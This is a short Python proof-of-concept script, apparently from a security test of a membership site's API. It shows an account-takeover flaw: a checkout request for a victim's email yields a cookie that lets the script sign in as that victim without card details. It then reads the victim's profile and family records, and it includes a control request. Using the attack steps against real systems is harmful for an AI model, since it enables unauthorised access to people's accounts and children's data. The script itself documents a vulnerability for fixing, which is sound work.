import sys, json
sys.path.insert(0, sys.argv[1])
from api import *
# Attacker knows victim's email (fresh@example.com) whose subscription was created minutes ago.
s,b,h=req('POST','/api/member/checkout/',{'email':'fresh@example.com','plan':'program-monthly'})
pend=next((v for k,v in h.items() if k.lower()=='set-cookie'),'').split(';')[0]
print('1. attacker starts checkout for victim email:', s, b, '| got cookie', pend[:20]+'...')
s,b,h=req('POST','/api/member/signin/',{'email':'fresh@example.com'},cookie=pend)
sess=next((v for k,v in h.items() if k.lower()=='set-cookie'),'').split(';')[0]
print('2. attacker signs in as victim with NO card digits:', s, b, '| session cookie set:', sess.startswith('tl_member='))
s,b,h=req('GET','/api/member/me/',cookie=sess); print('3. /api/member/me as victim:', s, b[:200])
s,b,h=req('GET','/api/program/family/',cookie=sess); print('4. victim family data readable:', s, b[:120])
print('5. (attacker could now POST /api/member/cancel/ and remove children; not executed for victim beyond reads)')
# control: no pending cookie
s,b,h=req('POST','/api/member/signin/',{'email':'fresh@example.com'}); print('control without pending cookie:', s, b)
